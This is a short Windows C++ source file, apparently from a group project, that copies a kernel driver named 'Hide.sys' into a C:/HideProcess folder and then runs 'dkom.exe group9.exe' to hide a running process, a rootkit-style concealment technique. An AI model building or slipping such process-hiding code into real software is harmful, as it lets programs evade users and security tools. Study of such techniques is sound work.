#define _CRT_SECURE_NO_DEPRECATE

#include <atlstr.h>

using namespace std;

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
{
	//create folder
	CString hide_process = "C:/HideProcess";
	if (!PathIsDirectory(hide_process))
	{
		::CreateDirectory(hide_process, NULL);
	}
	CString strExePath;
	CString strPath;
	GetModuleFileName(NULL, strPath.GetBufferSetLength(MAX_PATH + 1), MAX_PATH + 1);
	int nPos = strPath.ReverseFind(_T('\\'));
	strExePath = strPath.Left(nPos + 1);
	strExePath += "Hide.sys";
	CopyFile(strExePath, "C:/HideProcess/Hide.sys", FALSE);
	
	Sleep(1000);

	//hide process
	system("dkom.exe group9.exe");
}